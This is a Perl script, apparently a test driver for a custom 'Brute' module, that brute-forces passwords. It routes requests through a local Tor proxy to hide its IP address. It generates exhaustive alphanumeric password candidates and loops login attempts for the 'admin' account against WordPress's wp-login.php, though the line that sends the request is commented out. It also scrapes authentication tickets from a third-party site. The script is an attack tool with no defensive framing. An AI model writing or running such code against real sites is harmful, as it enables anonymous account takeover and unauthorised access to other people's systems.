#!/usr/bin/env perl 
#===============================================================================
#
#         FILE: test.pl
#
#        USAGE: ./test.pl  
#
#  DESCRIPTION: 
#
#      OPTIONS: ---
# REQUIREMENTS: ---
#         BUGS: ---
#        NOTES: ---
#       AUTHOR: YOUR NAME (), 
# ORGANIZATION: 
#      VERSION: 1.0
#      CREATED: 28.12.2015 19:32:28
#     REVISION: ---
#===============================================================================

use strict;
use warnings;
#use utf8;

use threads;
use threads::shared;

my ($timestart) = time();

use Brute;

#print 'test' , "\n";

my ($brute) = Brute->new();



sub getIp
{
	my ($code, $result) = $brute->ConnectTor('localhost', 9050, 'https://2ip.ru/');

	if ($result =~ /(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/ )
	{
		print "My ip:" , $1, "\n";
	}
	else
	{
		print $code, "\n";
	}
}


sub getIdent
{
	my ($code, $result) = $brute->ConnectTor('localhost', 9050, 'http://super-turbo-dubler.com');

	if ($result =~ /<input type="hidden" id="auth_ticket" value="(\w+)"/ )
	{
		print "Identi:" , $1, "\n";
	}
	else
	{
		print "Not found, code page:", $code, "\n";
	}
}

sub getIDforWP
{
	my ($code, $result) = $brute->ConnectTor('localhost', 9050, 'http://super-turbo-dubler.com');

	if ($result =~ /<input type="hidden" id="auth_ticket" value="(\w+)"/ )
	{
		print "Identi:" , $1, "\n";
	}
	else
	{
		print "Not found, code page:", $code, "\n";
	}

}

sub nextval
{
	my ($string) = @_;	

	my @arr=split(//,$string);
	
	my $last_char = pop @arr;
	
	my ($temp) = $last_char;

	$last_char++;

	if( $temp gt $last_char ) #$temp > $last_char
	{
		my ($tempStr) = ("");

		for(@arr)
		{
			$tempStr .= $_;
		}		

		if($temp eq 'z')
		{
			$tempStr .= 'A';
		}
		elsif($temp eq 'Z')
		{
			my $size = @arr;

			if ($size) #size of char's array
			{
				$tempStr = nextval($tempStr);
			}

			$tempStr .= '0';
		}
		else
		{
			$tempStr .= 'a';
		}

		return $tempStr
	}

	push @arr, $last_char;
	
	my ($retstr) = ("");

	for(@arr)
	{
		$retstr .= $_;
	}
	
	return $retstr;
}

sub creatWords4pass
{
	my ($pass) = @_;
	
	#count laeters = 26
	
	my ($count) = length  $pass;
	
	for (1..62**$count) 
	{	
		#print  $pass."\n";

		$pass = nextval($pass);
	}
	
	return undef;

}

sub WP
{	
	my ($name, $pass) = @_;
	
	#count laeters = 26
	
	my ($count) = length  $pass;

	
	for (1..62**$count) 
	{
		my ($params) = 'pwd=' . $pass
		. '&log=' . $name
		. '&testcookie=1redirect_to="ya.ru"';

		#my ($code, $result) = $brute->SendParamsPost('localhost/wordpress/wp-login.php', $params);
		
		#return ($pass, $code)  if ($code != 200);
		
	
		$pass = nextval($pass);
	}
	
	

	return undef;
}


sub bWP()
{
	my (@pass) = ('te00', '00000');

	for(@pass)
	{
		my ($pass, $code) = WP('admin', $_);

		if($code)
		{
			print 'code: ', $code,"\n", 'pass: ', $pass;
			last;
		}
	}

}


sub main
{
	#getIp();
	#getIdent();
	#creatWords4pass('0000');	
	#bWP();
	my (@chapters)= qw/1 2 3 4 5 6 7 8 9 0 a b c d e f g h i j k l m n o p q r s t u v w x y z A B C D E F G H I J K L M N O P Q R S T U V W X Y Z/;
	
	$brute->bustCustumCharactersFast_4(\@chapters);
	print "end\n";

	######################################################
	return 1;
		
}


=potok

my $tds = 9;

my $i : shared = 1;

my (@trl);

sub Potok
{
	my ($mytid) = threads->self->tid();

	while ($i<100)
	{
		{
			lock ($i);
			print " Поток - $mytid ,"; 
			print " число - $i \n";
			$i++;
		}

		sleep 1;
	}
}

for (1..$tds)
{
  push	@trl,  threads->create(\&Potok);
}


for(@trl)
 { 
	 $_->join; 
 }

=cut


main();

print "\ntime worked : ",time() -  $timestart, ' or ',  (time() -  $timestart)/60  ," minutes \n";	
